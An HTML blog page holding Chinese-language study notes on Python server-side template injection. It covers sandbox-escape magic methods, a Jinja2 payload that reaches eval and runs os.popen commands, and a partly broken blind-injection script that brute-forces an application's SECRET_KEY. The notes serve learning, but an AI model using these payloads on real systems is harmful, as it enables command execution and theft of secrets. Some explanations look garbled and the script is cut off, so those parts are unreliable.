<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>第五周1 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="SSTI  关于python中的  知识点：  漏洞分类  条件语句注入：攻击者在应用程序中的条件语句中注入模板代码，从而控制条件判断的分支，导致程序的逻辑错误。这种注入通常发生在基于条件语句的模板引擎，如 Django、Jinja2中。 命令执行注入：攻击者在应用程序中的命令执行语句中注入模板代码，从而执行任意系统命令，获取系统权限，对系统进行攻击等。这种注入通常发生在使用反序列化操作等动态执行">
<meta property="og:type" content="article">
<meta property="og:title" content="第五周1">
<meta property="og:url" content="http://example.com/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A81/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="SSTI  关于python中的  知识点：  漏洞分类  条件语句注入：攻击者在应用程序中的条件语句中注入模板代码，从而控制条件判断的分支，导致程序的逻辑错误。这种注入通常发生在基于条件语句的模板引擎，如 Django、Jinja2中。 命令执行注入：攻击者在应用程序中的命令执行语句中注入模板代码，从而执行任意系统命令，获取系统权限，对系统进行攻击等。这种注入通常发生在使用反序列化操作等动态执行">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-02-13T11:31:38.000Z">
<meta property="article:modified_time" content="2025-02-13T11:40:00.482Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-第五周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A81/" class="article-date">
  <time class="dt-published" datetime="2025-02-13T11:31:38.000Z" itemprop="datePublished">2025-02-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      第五周1
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>SSTI<br>  关于python中的  知识点：</p>
<ol>
<li>漏洞分类</li>
</ol>
<p>条件语句注入：攻击者在应用程序中的条件语句中注入模板代码，从而控制条件判断的分支，导致程序的逻辑错误。这种注入通常发生在基于条件语句的模板引擎，如 Django、Jinja2中。</p>
<p>命令执行注入：攻击者在应用程序中的命令执行语句中注入模板代码，从而执行任意系统命令，获取系统权限，对系统进行攻击等。这种注入通常发生在使用反序列化操作等动态执行代码的模板引擎中，如 FreeMarker、Velocity 等。</p>
<p>变量渲染注入：攻击者在应用程序中的变量渲染语句中注入模板代码，从而影响页面的输出，导致代码执行或信息泄漏等问题。这种注入通常发生在基于语法标签的模板引擎，如 Smarty 等中。</p>
<p>其他注入：SSTI 漏洞还有一些其他的注入方式，如在 URL、请求头、Cookie 等参数中注入模板代码，通过多重注入实现攻击等。</p>
<p>魔术方法<br>在一些模板引擎中，存在一些用于访问对象属性和方法的魔术方法，可利用这些魔术方法构造SSTI漏洞。<br>markdown 代码解读复制代码1. __class__：通过该魔术方法，攻击者可以获取目标对象的类名并进行操作。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2. __bases__：该魔术方法返回目标对象所在类的所有父类的元组，</span><br><span class="line">并且攻击者可以根据这些信息来构造恶意代码。</span><br><span class="line"></span><br><span class="line">3. __subclasses__()：该魔术方法返回目标对象的所有子类，</span><br><span class="line">并且攻击者可以根据这些信息来构造恶意代码。</span><br><span class="line"></span><br><span class="line">4. __globals__：该魔术方法返回当前作用域中的所有全局变量，</span><br><span class="line">并且攻击者可以利用这些变量来执行恶意代码。</span><br><span class="line"></span><br><span class="line">5. __import__()：该魔术方法用于动态加载模块，</span><br><span class="line">并且攻击者可以利用这个方法来执行任意代码。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>对于os模块<br>查看linecache中os模块</li>
</ol>
<p>为什么需要查看 linecache 中的 os 模块？<br>在 Python 3 中，当对一个未导入的模块（如 os 模块）执行 eval() 函数时，linecache 模块会发出一个警告，可利用这个警告来读取敏感信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Payload：</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">获取第 59 个<span class="built_in">type</span>的__init__.func_globals.values()[13][<span class="string">&#x27;eval&#x27;</span>]属性，然后使用 Python 的 <span class="built_in">eval</span>() 函数来执行字符串 __import__(\&quot;os\&quot;).popen(\&quot;<span class="built_in">ls</span>\&quot;).<span class="built_in">read</span>()</span><br><span class="line">__init__用来创建一个 Python 代码字符串所对应的函数对象，func_globals.values() 返回一个字典视图对象，包含了定义在该方法中的所有全局变量和函数。而 [13] 则是用来获取该字典视图中的第 13 个元素。由于这个方法中定义了一个名为 <span class="built_in">eval</span> 的全局函数变量，因此该元素为 <span class="built_in">eval</span> 函数本身。</span><br><span class="line">在 Python 中，<span class="built_in">eval</span>() 函数可以动态地解析并执行字符串作为 Python 代码进行计算。执行 os.popen(<span class="string">&quot;ls&quot;</span>).<span class="built_in">read</span>()命令，可获取当前目录下的所有文件列表</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>WAF绕过<br>盲注<br>通过回显内容的真假爆破字符串<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> char <span class="keyword">in</span> (name=<span class="string">&quot;SECRET_KEY&quot;</span>)%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">else</span>%&#125;0</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line"></span><br><span class="line">示例脚本</span><br><span class="line">import string</span><br><span class="line">import <span class="keyword">time</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://ip:port/&quot;</span></span><br><span class="line">s = string.printable</span><br><span class="line"></span><br><span class="line">def ssti(re):</span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;text=&#123;%for%20char%20in%20get_env(name=&quot;</span>SECRET_KEY<span class="string">&quot;)%&#125;&#123;%if%20char%20is%20matching(&#x27;str&#x27;)%20%&#125;1&#123;%else%&#125;0&#123;%endif%&#125;&#123;%endfor%&#125;&quot;</span><span class="string">&quot;&quot;</span>.replace(<span class="string">&quot;str&quot;</span>, re)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    </span><br><span class="line">    result = requests.post(url, data=payload, headers=headers, verify=False).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;1&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(re, result)</span><br><span class="line">        <span class="built_in">return</span> re</span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    time.sleep(0.5)</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A81/" data-id="cm739ljer0000ugui1t5v9hlm" data-title="第五周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A82/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          第五周2
        
      </div>
    </a>
  
  
    <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A83/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">第四周3</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A83/">第五周3</a>
          </li>
        
          <li>
            <a href="/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A82/">第五周2</a>
          </li>
        
          <li>
            <a href="/2025/02/13/%E7%AC%AC%E4%BA%94%E5%91%A81/">第五周1</a>
          </li>
        
          <li>
            <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A83/">第四周3</a>
          </li>
        
          <li>
            <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A82/">第四周2</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>